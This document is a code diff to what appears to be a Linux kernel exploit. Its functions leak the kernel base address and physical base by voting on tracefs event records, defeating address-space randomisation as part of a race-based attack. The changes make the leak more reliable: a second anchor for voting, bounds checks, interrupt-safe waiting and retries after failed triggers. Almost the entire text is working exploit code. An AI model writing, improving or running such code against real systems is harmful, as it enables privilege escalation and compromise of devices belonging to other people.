@@ -25,7 +25,8 @@
 #define SLIDE_REQUEUE_MAX_POLLS 1000
 #define SLIDE_REQUEUE_POLL_USEC 1000
 
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    !(defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE)
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
 
 static int slide_tracefs_write(const char *path, const char *value) {
@@ -395,12 +396,10 @@ static int slide_tracefs_parse_page(const unsigned char *page,
                 (unsigned long long)caller, event_id, record_len);
       }
       slide_tracefs_raw_callers++;
-      /* Single primary anchor only. Multi-anchor voting was tried and
-       * reverted: every caller votes once PER anchor, so a single-callsite
-       * workload ties N-N between the true slot and its anchor-delta ghost
-       * (A1-A2 = 0xA8000, observed 15-15), unresolvable by counts. A1 is
-       * the only anchor with confirmed slides (0x8000/0x18000/0xb8000/
-       * 0xd0000); auxiliary anchors stay defined for forensics. */
+      /* Dual-anchor voting: worker_thread and vfork anchors.
+       * The delta between WORKER_CALLER_OFF and VFORK_CALLER_OFF (0x44b60)
+       * is not a multiple of 0x8000, preventing ghost collisions on the
+       * 32 KB candidate grid. */
       static const uint64_t link_callers[] = {
         KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF,
 #ifdef SLIDE_TRACEFS_VFORK_CALLER_OFF
@@ -414,7 +413,9 @@ static int slide_tracefs_parse_page(const unsigned char *page,
           if (candidate <= slide_max_offset &&
               (candidate & 0x7fffULL) == 0) {
             size_t slot = (size_t)(candidate >> 15);
-            slide_tracefs_candidate_hits[slot]++;
+            if (slot < SLIDE_TRACEFS_CANDIDATES) {
+              slide_tracefs_candidate_hits[slot]++;
+            }
           }
         }
       }
@@ -438,7 +439,11 @@ static int slide_tracefs_trigger_vfork(void) {
       syscall(SYS_nanosleep, &hold, NULL);
       _exit(0);
     }
-    if (waitpid(child, &status, 0) != child) {
+    pid_t waited;
+    do {
+      waited = waitpid(child, &status, 0);
+    } while (waited < 0 && errno == EINTR);
+    if (waited != child) {
       pr_warning("slide tracefs waitpid failed errno=%d\n", errno);
       return 0;
     }
@@ -581,7 +586,10 @@ static int slide_tracefs_leak_kernel_base(void) {
     goto out;
   }
   if (!slide_tracefs_trigger()) {
-    goto out;
+    slide_tracefs_write(tracing_on, "0");
+    slide_tracefs_write(event_enable, "0");
+    sleep(1);
+    continue;
   }
   if (!slide_tracefs_write(tracing_on, "0") ||
       !slide_tracefs_write(event_enable, "0")) {
@@ -753,7 +761,7 @@ static useconds_t slide_enter_delay_usec(void) {
 #endif
 }
 
-static void slide_wait_before_consume(int sequence) {
+static void __attribute__((unused)) slide_wait_before_consume(int sequence) {
   if (sequence == 1) {
     useconds_t delay = slide_enter_delay_usec();
     if (delay) {
@@ -2481,7 +2489,8 @@ int app_trigger_fops_slide_route(void) {
 
 static int slide_leak_physical_base(void) {
   size_t started = gettime_ns();
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    !(defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE)
   uint64_t tracefs_base = 0;
   int tracefs_known = slide_tracefs_resolve_base(&tracefs_base);
   if (tracefs_known) {
@@ -2642,7 +2651,8 @@ static int slide_leak_physical_base(void) {
     slide_restore_physical_oracle();
     return 0;
   }
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    !(defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE)
   if (tracefs_known) {
     if (!slide_trigger_physical_slot(P0_ORACLE_GATE_RESTORE_SLOT)) {
       return 0;
